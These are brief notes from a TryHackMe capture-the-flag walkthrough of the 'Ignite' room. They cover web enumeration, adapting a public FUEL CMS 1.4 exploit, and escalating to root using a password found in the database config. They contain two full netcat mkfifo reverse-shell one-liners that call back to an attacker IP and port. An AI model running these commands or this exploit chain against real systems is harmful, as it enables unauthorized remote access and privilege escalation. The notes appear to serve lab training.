[https://tryhackme.com/room/ignite](https://tryhackme.com/room/ignite)
 
80 http
 
Apache/2.4.18
 
/home  
/index  
/0  
/assets  
robots.txt  
/fuel -> login page (rabbit hole)
 
FUEL CMS 1.4
 
Exploid-db
 
In exploit:  
Change ip to target ip, no port  
Change to import urllib.parse  
Change to urllib.parse.quote  
Take out proxy line  
Change to URL = url+"/fuel…..  
Change to r = requests.get(URL)  
Fix to print(r.text[0:dup])
 
In cmd:  
Find netcat reverse shell (change ip and port):
 
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.44.203 1234>/tmp/f
 
Netcat listener
 
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
 
On website default home page found that database is in fuel/application/config/database.php
 
Find passwd for root:mememe
 
Su root